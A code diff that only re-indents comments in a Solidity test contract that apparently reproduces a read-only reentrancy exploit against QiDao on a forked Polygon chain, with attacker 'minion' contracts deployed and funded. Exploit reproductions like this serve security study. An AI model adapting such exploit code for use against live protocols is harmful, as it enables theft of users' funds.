@@ -59,7 +59,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan, TokenB
     // https://polygonscan.com/address/0x8d1e7cE7DbB14aFB8782EaEa8010938cC457115e
     function setUp() external {
         cheat.createSelectFork(vm.envString("RPC_URL"), 34_716_800); // We pin one block before the exploit
-            // happened.
+        // happened.
 
         cheat.label(address(this), "Attacker Contract");
         cheat.label(address(CURVE_STMATIC_POOL), "Curve Pool");
@@ -152,7 +152,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan, TokenB
         console.log("\n===== 4. Deploy and fund Minion One =====");
         uint256 _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
         minionOne = new Attacker_Minion_One(address(this), 90_000_000_000_000_000_000_000, _borrowAmt); // (commander,
-            // depositAmt, borrowAmt)
+        // depositAmt, borrowAmt)
         updateBalanceTracker(address(minionOne));
 
         WMATIC.transfer(address(minionOne), WMATIC.balanceOf(address(this)));
@@ -191,7 +191,7 @@ contract Exploit_Qi_ReadOnlyReentrancy is TestHarness, BalancerFlashloan, TokenB
         console.log("\n===== 11. Deploy and fund Minion Three =====");
         _borrowAmt = QI_MIMATIC.balanceOf(address(QIDAO_DELEGATOR)) * 1000 / 1004;
         minionThree = new Attacker_Minion_One(address(this), 25_000_000_000_000_000_000_000, _borrowAmt); // (commander,
-            // depositAmt, borrowAmt)
+        // depositAmt, borrowAmt)
         updateBalanceTracker(address(minionThree));
 
         WMATIC.transfer(address(minionThree), WMATIC.balanceOf(address(this)));
